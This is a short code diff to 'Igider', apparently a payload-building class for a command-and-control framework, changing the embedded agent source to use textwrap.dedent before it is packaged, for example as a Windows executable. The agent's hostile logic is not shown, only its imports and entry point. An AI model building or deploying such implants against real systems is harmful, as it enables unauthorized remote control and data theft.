@@ -367,7 +367,7 @@ class Igider(PayloadType):
             await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
             
             output_format = self.get_parameter("output")
-            code_ex = """
+            code_ex = textwrap.dedent("""\
             import os, random, sys, json, socket, base64, time, platform, ssl, getpass
             import urllib.request
             from datetime import datetime
@@ -681,7 +681,7 @@ class Igider(PayloadType):
             if __name__ == "__main__":
                 igider = igider()
 
-            """
+            """)
             if output_format == "exe_windows":
                 try:
                     await self.update_build_step("Finalizing Payload", "Building Windows executable...")
